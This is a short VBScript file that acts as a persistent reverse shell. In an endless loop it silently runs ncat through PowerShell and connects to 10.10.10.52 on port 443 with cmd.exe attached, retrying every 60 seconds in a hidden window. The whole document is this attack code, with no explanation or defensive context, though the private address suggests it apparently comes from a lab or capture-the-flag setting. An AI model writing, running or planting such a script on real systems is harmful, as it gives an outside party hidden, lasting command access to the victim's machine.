Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
	ncShell.Run "powershell.exe ./ncat.exe 10.10.10.52 443 -e cmd.exe", 0, true
	WScript.Sleep(60000)
loop